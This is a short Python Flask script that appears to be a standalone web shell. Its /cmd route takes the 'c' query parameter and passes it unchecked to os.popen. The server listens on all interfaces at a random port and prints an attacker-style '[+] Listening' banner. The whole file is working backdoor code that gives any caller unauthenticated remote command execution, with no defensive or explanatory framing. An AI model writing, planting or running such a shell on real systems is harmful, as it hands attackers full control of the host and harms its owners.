from flask import Flask, request
import os, socket

app = Flask(__name__)

def find_free_port():
    s = socket.socket()
    s.bind(("", 0))
    port = s.getsockname()[1]
    s.close()
    return port

@app.route("/cmd")
def cmd():
    return os.popen(request.args.get("c", "")).read()

if __name__ == "__main__":
    port = find_free_port()
    print(f"[+] Listening on port {port}", flush=True)
    app.run(host="0.0.0.0", port=port)